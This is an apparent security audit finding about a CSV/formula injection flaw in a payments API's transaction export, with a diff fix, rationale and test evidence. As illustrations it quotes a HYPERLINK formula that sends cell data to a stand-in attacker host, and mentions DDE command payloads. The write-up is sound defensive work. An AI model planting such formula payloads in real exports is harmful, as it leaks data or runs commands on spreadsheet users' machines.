### SEC9 · Transactions CSV export writes caller-supplied references as live spreadsheet formulas, and a bare CR splits a row · · Severity: Medium

**Lead:** Team 45 heads-up list (SEC9), verified by us.

**What's wrong:** `GET /v1/transactions/export` writes each transaction's `reference` into the CSV with only comma/quote/LF quoting. A reference that starts with `=`, `+`, `-`, `@`, TAB or CR is written as-is, so Excel or Sheets evaluates it as a formula when finance opens the file (CSV/formula injection, CWE-1236). A reference that contains a bare CR is not quoted, and spreadsheet readers treat CR as a line break, so the row splits in two and the columns after it shift. There is no formula guard at all in this repo (the lead described a guard that misses TAB/CR; ours has none).

**Why it happens:** `apps/api/src/transactions/exportCsv.ts:16-21` `csvEscape` quotes only on `,`, `"` or `\n`. The reference comes from the API-key caller (`POST /v1/transactions` body `reference`, `routes/transactions.ts:71`, stored unvalidated by `payments/authorize.ts:107`), typically echoing an order id or customer-entered text from the merchant's shop. `buildTransactionsExportCsv` (`:23-32`, called by `routes/transactions.ts:149`) passes it through `csvEscape` and nothing else.

**What it breaks:** A reference such as `=HYPERLINK("http://evil/?"&A1,"open")` becomes a clickable link that leaks the cell data when a finance user opens the export; `=cmd|...` style payloads trigger DDE prompts in older Excel. A reference with a CR breaks the row structure, so the reconciliation sheet has misaligned amounts.

**Why it needed a fix:** the export is the file the merchant's finance team opens in a spreadsheet; the security review checks for this class. The value is outside the dashboard user's control (it comes from the integration), so the user cannot defend against it.

**Fix:** `apps/api/src/transactions/exportCsv.ts:17-18`
```diff
 function csvEscape(value: string): string {
-  if (value.includes(",") || value.includes('"') || value.includes("\n")) {
+  if (/^[=+\-@\t\r]/.test(value)) value = `'${value}`; // SEC9 (CWE-1236): a spreadsheet would run it as a formula
+  if (value.includes(",") || value.includes('"') || value.includes("\n") || value.includes("\r")) {
```
A leading formula character gets the OWASP-recommended `'` prefix, so the spreadsheet shows text; a CR anywhere forces RFC 4180 quoting.

**Why this is the smallest correct fix:** `csvEscape` is the single place the free-text column is serialised. *Why not reject such references at authorize?* That changes the checkout/authorize contract, which we must not touch, and leaves rows already stored. *Why not escape every column?* The other columns are a UUID, a status enum, `formatBhd` amounts and an ISO timestamp, which never carry user text; prefixing a negative amount would corrupt the number. *Why not strip the characters?* That changes the merchant's reference; the prefix is the recognised neutraliser and is visible.

**Proof:** `SEC9: formula-leading references are neutralised and a bare CR cannot split a row` (`apps/api/src/transactions/exportCsv.test.ts`). Before the fix the references came back raw (`=HYPERLINK(...)`, `+1+1`, `\r=1`, unquoted `a\rb`). After: each formula-leading value starts with `'` and CR-bearing values are quoted.

**Regression risk:** only references that begin with `= + - @ TAB CR` change (a visible leading `'`); ordinary references such as `order-1` are byte-identical. `exportCsv.test.ts`, `routes/transactions.test.ts` and `routes/transactions.audit.test.ts` pass (22/22).

Lines: prod +2/-1, test +11/-0
